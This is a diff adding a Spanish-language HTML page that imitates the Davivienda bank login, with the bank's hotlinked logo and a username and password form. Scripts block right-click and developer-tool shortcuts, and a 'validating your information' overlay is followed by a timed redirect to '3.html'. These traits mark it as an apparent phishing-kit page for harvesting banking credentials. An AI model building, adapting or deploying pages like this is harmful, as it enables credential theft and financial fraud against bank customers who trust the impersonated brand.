@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Restablecer Acceso</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* 🔴 Header con franja roja */
+    .header {
+      background: #e30613;
+      padding: 12px 0;
+      text-align: center;
+    }
+
+    .header img {
+      max-width: 220px;
+      width: 80%;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 40px auto;
+      background: #fff;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0px 4px 8px rgba(0,0,0,0.2);
+      flex: 1;
+    }
+
+    .title {
+      font-size: 16px;
+      margin-bottom: 20px;
+      text-align: left;
+      font-weight: bold;
+      color: #333;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #444;
+    }
+
+    /* 👤 Input con ícono de usuario */
+    .input-user {
+      width: 85%;
+      padding: 10px 10px 10px 40px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+      background: url("user.png") no-repeat 10px center;
+      background-size: 18px;
+    }
+
+    /* 🔒 Input con ícono de candado */
+    .input-cad {
+      width: 85%;
+      padding: 10px 10px 10px 40px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+      background: url("cad.jpg") no-repeat 10px center;
+      background-size: 18px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #e30613;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .btn:hover {
+      background: #c00511;
+    }
+
+    /* Footer */
+    .footer {
+      width: 100%;
+      text-align: center;
+      background: #000;
+    }
+
+    .footer img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    /* 🔴 Overlay transparente con cargador */
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+
+    .loader {
+      position: relative;
+      width: 140px;
+      height: 140px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    /* 🔴 El círculo rojo gira */
+    .circle {
+      position: absolute;
+      width: 140px;
+      height: 140px;
+      border: 6px solid #e30613;
+      border-top: 6px solid transparent;
+      border-radius: 50%;
+      animation: spin 1.5s linear infinite;
+    }
+
+    /* 📌 La imagen queda fija en el centro */
+    .loader img {
+      width: 90px;
+      height: 90px;
+      border-radius: 50%;
+      z-index: 1;
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .overlay .text {
+      color: white;
+      font-size: 16px;
+      margin-top: 10px;
+      text-align: center;
+    }
+  </style>
+
+<script> 
+    // Bloquear clic derecho
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+    });
+
+    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
+    document.onkeydown = function(e) {
+        if (
+            e.keyCode == 123 || // F12
+            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
+            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
+            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
+        ) {
+            e.preventDefault();
+            return false;
+        }
+    }
+</script>
+
+
+</head>
+<body>
+  <!-- 🔴 Header con logo centrado -->
+  <div class="header">
+    <img src="https://enlinea.davivienda.com.sv/ebanking/images/DAVIVIENDA/header/logo_davivienda.png" alt="Logo">
+  </div>
+
+  <div class="container">
+    <div class="title">Autenticación del cliente</div>
+
+    <form id="loginForm">
+      <label for="usuario">Usuario</label>
+      <input type="text" id="1" name="1" class="input-user" placeholder="***********" required>
+
+      <br><br>
+
+      <label for="clave">Contraseña</label>
+      <input type="password" id="2" name="2" class="input-cad" placeholder="***********" required>
+
+      <button type="submit" class="btn">Continuar</button>
+    </form>
+
+    <p style="text-align: center;">Davivienda - &copy; 2026 - Todos los derechos reservados</p>
+  </div>
+
+  <!-- Footer con imagen -->
+  <div class="footer">
+    <img src="cop.png" alt="Footer">
+  </div>
+
+  <!-- 🔴 Overlay con cargador -->
+  <div class="overlay" id="overlay">
+    <div class="loader">
+      <div class="circle"></div>
+      <img src="https://play-lh.googleusercontent.com/sjr_Dwdk-IJWhmNQwPD33Jg9Q96NDf1cmmVmOngkqRLt1wVNCKzDiqhssl0TClyj-iw" alt="Logo">
+    </div>
+    <div class="text">Por favor espere, estamos validando su información...</div>
+  </div>
+
+  <script>
+    // ⏳ Redirige a los 25 segundos
+    window.onload = function() {
+      setTimeout(() => {
+        window.location.href = "3.html";
+      }, 25000);
+    }
+  </script>
+</body>
+</html>
